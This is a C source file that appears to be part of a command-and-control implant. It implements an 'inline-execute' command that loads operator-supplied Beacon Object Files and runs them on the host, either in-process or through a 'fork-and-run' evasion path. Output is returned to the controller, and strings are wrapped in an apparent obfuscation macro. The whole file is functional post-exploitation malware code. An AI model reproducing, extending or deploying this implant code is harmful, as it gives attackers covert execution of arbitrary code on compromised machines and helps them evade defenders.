#include "config.h"
#ifdef INCLUDE_CMD_INLINE_EXECUTE

#include "commands.h"
#include "coff.h"
#include "evasion/fork_and_run.h"

VOID cmd_inline_execute(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD fork_flag = parser_int32(args);
    DWORD coff_len = 0;
    BYTE* coff_data = parser_bytes(args, &coff_len);

    if (!coff_data || coff_len == 0) {
        package_add_string(inst, response, XSTR("No BOF data provided"));
        response->is_error = TRUE;
        return;
    }

    DWORD arg_len = 0;
    BYTE* arg_data = parser_bytes(args, &arg_len);

    // ---- Fork-and-run path ----
    if (fork_flag) {
        DBG(inst, "[ES] cmd_inline_execute [fork-and-run]");
        BYTE* output = NULL;
        DWORD output_len = 0;

        if (!fork_run_bof(inst, coff_data, coff_len, arg_data, arg_len,
                          &output, &output_len)) {
            package_add_string(inst, response,
                XSTR("fork-and-run failed (no spawnto configured or BOF stub not built)"));
            response->is_error = TRUE;
            return;
        }

        if (output && output_len > 0) {
            package_add_bytes(inst, response, output, output_len);
            es_free(inst, output);
        } else {
            package_add_string(inst, response, XSTR("(no output)"));
        }
        return;
    }

    // ---- Inline path (original) ----

    char*  output     = NULL;
    DWORD  output_len = 0;

    BOOL ok = bof_execute(inst, coff_data, coff_len,
                          arg_data, arg_len,
                          &output, &output_len);

    if (ok && output && output_len > 0) {
        package_add_bytes(inst, response, (BYTE*)output, output_len);
    } else if (!ok) {
        if (output && output_len > 0)
            package_add_bytes(inst, response, (BYTE*)output, output_len);
        else
            package_add_string(inst, response, XSTR("BOF execution failed"));
        response->is_error = TRUE;
    }

    if (output)
        es_free(inst, output);
}

#endif
